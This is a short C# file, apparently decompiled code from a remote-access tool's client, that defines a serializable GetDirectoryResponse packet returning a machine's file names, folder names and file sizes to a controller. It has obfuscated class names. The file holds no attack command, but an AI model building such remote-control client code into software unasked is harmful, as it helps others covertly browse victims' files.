using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetDirectoryResponse : GInterface4
{
	public string[] Files { get; set; }

	public string[] Folders { get; set; }

	public long[] FilesSize { get; set; }

	public GetDirectoryResponse()
	{
	}

	public GetDirectoryResponse(string[] files, string[] folders, long[] filessize)
	{
		Files = files;
		Folders = folders;
		FilesSize = filessize;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
